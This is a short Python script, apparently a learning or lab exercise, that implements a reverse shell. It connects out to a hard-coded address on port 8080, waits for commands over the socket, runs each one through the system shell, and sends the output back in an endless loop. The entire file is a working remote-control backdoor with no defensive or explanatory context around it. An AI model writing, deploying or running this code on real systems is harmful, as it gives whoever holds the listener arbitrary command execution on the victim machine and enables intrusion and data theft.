import socket
import subprocess

class connectionSocket:
    def __init__(self,host,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((host, port))


    def command_interaction(self,command):
         return subprocess.check_output(command, shell=True)

    def listening(self):
        while True:
            command = self.connection.recv(1024)
            command_output = self.command_interaction(command)
            self.connection.send(command_output)
        self.connection.close()

socket_obj = connectionSocket("192.168.1.59",8080)
socket_obj.listening()
